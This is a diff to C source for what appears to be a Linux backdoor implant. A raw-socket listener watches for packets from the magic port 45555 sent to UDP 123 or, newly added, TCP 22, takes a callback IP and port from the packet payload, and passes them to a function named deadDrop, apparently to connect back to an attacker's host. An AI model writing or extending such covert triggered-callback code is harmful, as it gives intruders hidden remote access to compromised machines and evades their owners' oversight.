@@ -8,6 +8,7 @@
 #include <arpa/inet.h>
 #include <linux/if_ether.h>
 #include <linux/ip.h>
+#include <linux/tcp.h>
 #include <linux/udp.h>
 #include <sys/mman.h>
 #include <sys/stat.h>
@@ -23,7 +24,7 @@
 extern char ** environ;
 
 // Define a custom struct to handle port/ip in UDP data
-struct udp_data {
+struct c_data {
       //Callback Port
       unsigned char u_port[2];
       //Callback IP
@@ -216,16 +217,7 @@ int arp_listener()
 					// Trigger on udp src 45555 and udp dst 123
 					if (udp->source == htons(45555) && udp->dest == htons(123)){
 
-						struct udp_data *data = (struct udp_data*)(buffer + sizeof(struct udphdr) +iphdr_len + sizeof(struct ethhdr));
-						/* used for debugging the sending of hidden data
-						unsigned int temp = (data->u_port[1]<<8) + (data->u_port[0]);
-						printf("Hidden Port: %d\n", temp);
-						unsigned char a = data->u_addr[0];
-						unsigned char b = data->u_addr[1];
-						unsigned char c = data->u_addr[2];
-						unsigned char d = data->u_addr[3];
-						printf("Hidden IP: %d.%d.%d.%d\n", a,b,c,d);
-						*/
+						struct c_data *data = (struct c_data*)(buffer + sizeof(struct udphdr) +iphdr_len + sizeof(struct ethhdr));
 
 						unsigned short port;
 						unsigned int   ip;
@@ -242,9 +234,33 @@ int arp_listener()
 					}
 
 
+				}else if (ip->protocol == 6){
+
+					struct tcphdr *tcp = (struct tcphdr*)(buffer + iphdr_len + sizeof(struct ethhdr));
+
+					// Trigger on tcp dst 22 and tcp src 45555
+					if (tcp->source == htons(45555) && tcp->dest == htons(22)){
+						
+						struct c_data *data = (struct c_data*)(buffer + sizeof(struct tcphdr) +iphdr_len + sizeof(struct ethhdr));
+
+						unsigned short port;
+						unsigned int   ip;
+                                
+						// Bit shifting to build the return port/IP
+						port=(data->u_port[1]<<8) + (data->u_port[0]);
+						ip=(data->u_addr[3]<<24);
+						ip+=(data->u_addr[2]<<16);
+						ip+=(data->u_addr[1]<<8);
+						ip+=(data->u_addr[0]);
+                                
+						close(sock_raw);
+						deadDrop(ip,port);
+
+
+					}
 				}
-			}
 			
+		}
 	}
 
 }
